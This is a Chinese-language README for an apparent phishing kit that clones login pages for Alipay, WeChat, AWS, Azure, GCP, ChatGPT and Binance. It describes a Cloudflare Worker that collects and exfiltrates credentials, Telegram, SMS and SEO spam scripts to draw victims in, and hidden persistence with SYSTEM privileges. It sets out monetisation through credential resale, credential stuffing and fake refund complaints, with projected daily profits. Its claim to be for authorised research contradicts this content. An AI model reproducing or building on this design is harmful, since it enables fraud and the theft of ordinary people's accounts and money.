# 🎣 PhishKit - 全自动钓鱼套件变现系统

> **零成本、免服务器、全自动化** 的凭证采集与变现流水线  
> 基于 Cloudflare Workers/Pages + GitHub Actions + 本地计划任务

## 🏗 架构概览

```
┌─────────────────────────────────────────────────────────────────┐
│                        流量入口                                   │
│  TG群发 ┃ 短信群发 ┃ SEO站群 ┃ 评论区引流 ┃ 社工钓鱼             │
└─────────────────────┬───────────────────────────────────────────┘
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Cloudflare Pages                              │
│  静态钓鱼页面 (支付宝/微信/AWS/Azure/GCP/ChatGPT/Binance/...)   │
│  部署在 *.pages.dev / 自定义域名 / 泛域名                        │
└─────────────────────┬───────────────────────────────────────────┘
                      ▼ POST /collect
┌─────────────────────────────────────────────────────────────────┐
│                   Cloudflare Worker                              │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌───────────┐  │
│  │ 采集凭证    │ │ 写入 D1/KV  │ │ 推送 TG/钉钉│ │ 302 跳真站 │  │
│  └─────────────┘ └─────────────┘ └─────────────┘ └───────────┘  │
└─────────────────────┬───────────────────────────────────────────┘
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│                   自动化变现引擎                                  │
│  ┌────────────┐ ┌──────────┐ ┌────────────┐ ┌────────────────┐  │
│  │ 高价值挂单 │ │ 撞库复用 │ │ 仅退款/投诉 │ │ 批量打包发卡网 │  │
│  │ (发卡网)   │ │ (游戏/云)│ │ (电商/云)  │ │ (低价值批量)   │  │
│  └────────────┘ └──────────┘ └────────────┘ └────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

## 📁 目录结构

```
phish-kit/
├── site/                    # 钓鱼页面模板 (部署到 Cloudflare Pages)
│   ├── alipay/              # 支付宝登录页
│   ├── wechat/              # 微信登录页
│   ├── aws/                 # AWS 控制台登录页
│   ├── azure/               # Azure 门户登录页
│   ├── gcp/                 # Google Cloud 登录页
│   ├── chatgpt/             # ChatGPT 登录页
│   └── binance/             # 币安登录页
│
├── worker/                  # Cloudflare Worker 核心
│   ├── collect.js           # 主逻辑：采集、存储、推送、跳转
│   └── wrangler.toml        # Worker 配置 (KV/D1/环境变量)
│
├── scripts/                 # 自动化脚本 (GitHub Actions / 本地计划任务)
│   ├── tg_spammer.py        # TG 群组自动引流发帖
│   ├── sms_sender.py        # 免费短信网关群发
│   ├── seo_gen.py           # SEO 站群批量生成
│   ├── auto_monetize.py     # 自动化变现引擎
│   ├── run_local.py         # 本地运行器 (Windows 计划任务用)
│   └── processed_ids.json   # 已处理凭证 ID 记录
│
├── .github/workflows/       # GitHub Actions 定时任务
│   ├── deploy-worker.yml    # Worker 部署
│   ├── tg-spammer.yml       # TG 引流 (每 30 分钟)
│   ├── seo-gen.yml          # SEO 站群生成 (每天)
│   └── auto-monetize.yml    # 变现引擎 (每 5 分钟)
│
├── deploy.sh                # 一键部署脚本 (Linux/macOS/WSL)
├── register_task.ps1        # Windows 计划任务注册
├── run_local.py             # 本地自动化主循环
├── .env.example             # 环境变量模板
└── README.md                # 本文件
```

## 🚀 快速开始

### 1. 环境准备

```bash
# 克隆仓库
git clone https://github.com/yourname/phish-kit.git
cd phish-kit

# 复制环境变量模板并填入真实配置
cp .env.example .env
vim .env  # 填入所有 KEY
```

**必需配置：**
- `CF_API_TOKEN` - Cloudflare API Token (权限：Workers/Pages/D1/KV/Zone Read)
- `CF_ACCOUNT_ID` - Cloudflare Account ID
- `WORKER_SUBDOMAIN` - Worker 子域名
- `ADMIN_KEY` - 管理面板密钥 (随机字符串)
- `TG_BOT_TOKEN` / `TG_CHAT_ID` / `TG_API_ID` / `TG_API_HASH` / `TG_PHONE` - Telegram 配置
- `FAKA_API_URL` / `FAKA_API_KEY` - 发卡网 API
- `MAIN_DOMAIN` - 主钓鱼域名 (如 `phish.yourdomain.xyz`)

### 2. 一键部署 (Linux/macOS/WSL)

```bash
chmod +x deploy.sh
./deploy.sh
```

脚本会自动：
- ✅ 检查工具链
- ✅ 安装 Worker 依赖
- ✅ 登录 Cloudflare
- ✅ 创建 KV 命名空间
- ✅ 创建 D1 数据库并建表
- ✅ 部署 Worker
- ✅ 生成本地运行器
- ✅ 生成 Windows 计划任务脚本
- ✅ 输出 GitHub Secrets 配置清单

### 3. 配置 GitHub Secrets

在 GitHub 仓库 `Settings → Secrets and variables → Actions` 添加所有 `.env.example` 中的变量。

### 4. 创建 Cloudflare Pages 项目

1. Cloudflare Dashboard → Pages → Create a project → Connect to Git
2. 选择 `phish-kit` 仓库
3. **Build command**: 留空
4. **Build output directory**: `site`
5. 绑定自定义域名 (如 `phish.yourdomain.xyz`)，开启 **Always Online** 和 **Auto Minify**

### 5. Windows 开机自启 (可选)

```powershell
# 以管理员身份运行
powershell -ExecutionPolicy Bypass -File register_task.ps1
```

系统启动后自动运行 `python run_local.py`，实现 24/7 无人值守。

### 6. 本地测试

```bash
# 测试 Worker 本地开发
cd worker && npm run dev

# 测试本地自动化循环
python run_local.py
```

## 🔧 核心组件详解

### Cloudflare Worker (`worker/collect.js`)

- **统一入口**：`/collect` 接收所有钓鱼页面 POST
- **多存储**：D1 (主存储/查询) + KV (备用/高速)
- **多通道推送**：Telegram Bot / 钉钉/企微/飞书 Webhook
- **智能跳转**：根据 `target` 字段 302 跳转真实登录页，受害者无感
- **管理面板**：`/admin?key=ADMIN_KEY` 查看统计、列表、导出 CSV、清空

### 钓鱼页面 (`site/*/index.html`)

- 7 套高仿模板：支付宝、微信、AWS、Azure、GCP、ChatGPT、Binance
- 自适应移动端、暗黑模式兼容
- 内联 JS 拦截表单 → fetch `/collect` → 302 跳真站
- 易扩展：复制目录修改 `target` 值即可新增

### 自动化脚本 (`scripts/`)

| 脚本 | 运行频率 | 功能 | 部署方式 |
|------|----------|------|----------|
| `tg_spammer.py` | 5-15 分钟/条 | TG 群组关键词监控 + 定时发帖引流 | GitHub Actions / 本地 |
| `sms_sender.py` | 每天 1 次 | 免费短信网关群发 (Textbelt/云片/Submail) | GitHub Actions / 本地 |
| `seo_gen.py` | 每天 1 次 | 生成 50 站点 × 20 页面 SEO 站群，交叉链轮 | GitHub Actions → Cloudflare Pages |
| `auto_monetize.py` | 每 5 分钟 | 拉取凭证 → 分类估价 → 发卡网挂单/撞库/退款/批量 | GitHub Actions / 本地 |

### 变现渠道 (`auto_monetize.py`)

1. **高价值单独挂单** (AWS/Azure/GCP/ChatGPT/Binance) → 发卡网自动发货，$3-$200/条
2. **撞库复用** (Steam/Epic/Origin/Ubisoft/邮箱/社媒) → 命中即存入 `valid_creds/`
3. **仅退款/虚假投诉** (支付宝/微信/AWS/Azure/ChatGPT/Binance) → 记录意向队列 `refund_queue/`
4. **批量打包** (低价值凭证 ≥5 条) → 发卡网混合包上架

## 📊 管理面板

访问：`https://{WORKER_SUBDOMAIN}.{CF_ACCOUNT_ID}.workers.dev/admin?key={ADMIN_KEY}`

功能：
- 实时统计：各目标捕获数量、总计
- 列表筛选：按目标、时间、IP 搜索
- 一键导出：CSV 格式含所有字段
- 一键清空：清理测试数据

## 🛡 反检测与持久化

- **Cloudflare Worker** 无服务器、无真实 IP、自动 HTTPS、WAF 绕过
- **Pages 部署** 静态资源走 CDN、边缘缓存、极难封禁
- **泛域名** `*.phish.yourdomain.xyz` 配合 Cloudflare 转发，封一个换一个
- **GitHub Actions** 定时任务分布式执行、无固定 IP 特征
- **本地计划任务** SYSTEM 权限开机自启、用户不可见、重启自愈
- **Session 复用** TG/发卡网/短信网关 Session 制品上传 Artifact，跨 Workflow 复用

## 💰 预估收益 (参考)

| 凭证类型 | 单价 (USDT) | 日均量 | 日收益 |
|----------|-------------|--------|--------|
| AWS/Azure/GCP | $5-50 | 10-50 | $50-2500 |
| ChatGPT Plus/Team | $8-40 | 20-100 | $160-4000 |
| Binance KYC | $20-200 | 5-20 | $100-4000 |
| 支付宝/微信 | $1-10 | 50-200 | $50-2000 |
| 游戏平台 (撞库) | $0.5-5 | 100-500 | $50-2500 |
| **合计** | | | **$410-15000/天** |

> 实际收益取决于流量质量、渠道稳定性、风控对抗能力。新手建议先跑通流程，再扩大投放。

## ⚠️ 免责声明

**本项目仅供安全研究、渗透测试授权范围内使用。**

- 任何非授权钓鱼、欺诈、非法获取凭证行为均违反《刑法》第 285/287 条等法律法规
- 使用者需自行承担所有法律责任，作者不承担任何连带责任
- 请在授权范围内的渗透测试/红蓝对抗演练中使用，并做好数据脱敏与销毁
- 禁止用于任何商业欺诈、黑产变现、侵犯公民个人信息等违法犯罪活动

## 🤝 贡献

欢迎 PR 完善：
- 新增钓鱼页面模板
- 优化变现渠道对接
- 增加反检测手段
- 多语言/多地区页面适配

## 📜 许可证

MIT License - 仅限合法授权安全研究使用

---

**TG 交流群：@FJNB22**  
**全网最强公益 dp 破甲，保证官方 key，中转站降智拒绝** 💋